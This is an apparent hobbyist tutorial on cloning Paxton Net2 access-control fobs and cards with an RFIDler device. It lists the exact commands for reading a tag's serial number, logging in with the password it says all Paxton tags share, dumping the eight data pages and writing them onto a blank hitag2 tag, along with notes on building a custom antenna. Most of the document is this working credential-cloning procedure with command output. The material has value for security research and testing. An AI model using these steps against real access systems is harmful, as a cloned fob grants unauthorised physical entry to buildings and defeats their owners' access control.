# How to copy, read and write Paxton fobs and cards with an RFIDler

Paxton fobs and readers are popular in the UK especially the Net2 system where the fobs look like this with a blue ring.
![Paxton Fob](https://gist.githubusercontent.com/natmchugh/18e82761dbce52fa284c87c190dc926f/raw/fob.jpg "Paxton Fob")

Readers often look like this

![Paxton Reader](https://gist.githubusercontent.com/natmchugh/18e82761dbce52fa284c87c190dc926f/raw/reader.jpg "Paxton Reader")


This guide covers how to read an existing tag and write data to another tag. If that tag has been authorised for entry the new tag will be able to gain entry and will be seen by the reader to be the same tag, effectively a clone. You can copy cards to fobs and fobs to cards. From now on both fobs and cards will be referred to as tags.

## Equipment
* An RFIDLer available here from one of the tools authors http://rfidiot.org/
* Enamelled copper wire I used 33swg or ~0.25 mm
* Some Paxton fobs or hitag2 cards
* (optional) a soldering iron but you my be able to get away without one

These Paxton fobs use hitag2 technology and can be copied to hitag2 cards and fobs etc.

## Antennas
The RFIDler comes with a coil antenna that is very good for reading cards and sniffing readers. It does not however do well with other tag form factors. In order to read and write to a Paxton fob I had to wind my own antenna. This is covered further [here]/(natmchugh/18e82761dbce52fa284c87c190dc926f#reading-a-card).

## Reading a tag

First we need to set the RFIDLer to hitag2 cards config
```
RFIDler> set tag hitag2
OK

*HITAG2> save
OK

HITAG2>
```
Next we need to try reading the tag serial number. This is readonly and cannot be changed but it is not used in identifying access. It can be read without knowing the password and logging into the tag and is also known as page 0.

```
HITAG2> reader
12345678
12345678
12345678
```
You should get the tag serial number being repeated continuously which means there is a good strong signal. If you don't then adjust the tag and coil position until you do.

The next step is to login to the tag by supplying the password.

```
HITAG2> login BDF5E846
06F907C2
```
The response should be the config bit and tag password. This is held on page 2 of the tag and is the same for all Paxton tags I tested. If instead you get "Login failed!" don't give up just try again.

Once you have logged in you can now read the 8 pages of data held on the tag. But first you will need to set the the VTag type to hitag2 as well.

```
HITAG2> read 0
VTag not compatible!

HITAG2> set vtag hitag2
OK

*HITAG2> save
OK

HITAG2> read 1
1: BDF5E846

HITAG2> read 0
0: 12345678

*HITAG2> read 1
1: BDF5E846

HITAG2> read 2
…
```

repeat all the way up to page 7
Once you have this data you have all the info you need to clone the tag. The important pages are 4-7 these contain the data on which the system identifies for access.

## Can I Emulate a Paxton tag?
Not currently with an RFIDler. The data flow is more complicated than some other tags involving a back and forth of commands the reader could send. The chips in hitag2 tags handle these commands really well. So why not just use one of those i.e. clone to a hitag2 tag.

## Writing a Tag

Despite not being able to emulate a hitag to write a tag you need to load your tag data into the virtual tag or vtag.
```
HITAG2> VWRITE 1 BDF5E846PAGE2DATPAGE3DATPAGE4DATPAGE5DATPAGE6DATPAGE7DAT
BDF5E846PAGE2DATPAGE3DATPAGE4DATPAGE5DATPAGE6DATPAGE7DAT

```

Where PAGE1DAT etc is the 8 hex digits you got by reading the original tag.

Then check the contents of the VTAG

```
HITAG2> vtag
              Type: HITAG2
         Emulating: NONE
           Raw UID:
               UID:

     PWD Block (1): BDF5E846    ...F

     Key Block (2): PAGE2DAT    ..-.

  Config Block (3): PAGE3DAT

        Page 1 & 2: 0 = Read / Write
            Page 3: 0 = Read / Write
        Page 4 & 5: 0 = Read / Write
        Page 6 & 7: 0 = Read / Write
          Security: 0 = Password
              Mode: 0 = Public Mode B
        Modulation: 0 = Manchester

     PWD Block (3): GE3DAT      .=.

              Data:
                 0: 12345678
                 1: BDF5E846
                 2: PAGE2DAT
                 3: PAGE3DAT
                 4: PAGE4DAT
                 5: PAGE5DAT
                 6: PAGE6DAT
                 7: PAGE7DAT


```

If you are happy with the data as shown in the VTAG then you can clone onto another tag

```
CLONE <BDF5E846|4D494B52>
1: BDF5E846
2: PAGE2DAT
4: PAGE4DAT
5: PAGE5DAT
6: PAGE6DAT
7: PAGE7DAT

```

The password used to clone the tag at the end depends on where you got the tag from. A new blank hitag2 tag should have the password 4D494B52. If a tag has been set up for Paxton readers previously it will have the password BDF5E846.

## Creating a DIY antenna for Paxton fobs

I was able to read and write genuine Paxton fobs by creating a coil antenna that allowed the fob to be placed inside. I estimated the inductance at 200µH. This suggested that with a coil diameter of 2cm roughly 120 turns would give a similar impedance.

My top tip for winding the antenna would be to use super glue to get the initial loops on and secure them at the correct height and then electrical insulation tape to protect the coil.

![Antenna](https://gist.githubusercontent.com/natmchugh/18e82761dbce52fa284c87c190dc926f/raw/paxton_antenna.jpg "Antenna")

To test your antenna, putting a tag in and viewing the data as a graph vs time can help in fine tuning your antenna design.

To do this there is a python wrapper for rfidler that can call it via the api and plot the results

```
cd python
python rfidler.py /dev/tty.usbmodem... 'set tag hitag2' 'uid' plot 1500
```

This sets the tag type as hitag2 and then asks the tag for its serial number before plotting the results.

![Plot](https://gist.githubusercontent.com/natmchugh/18e82761dbce52fa284c87c190dc926f/raw/plot.png "Plot")

Once you start getting good pulses that can be easily distinguished from the background noise you can attempt to use the antenna to read a fob.

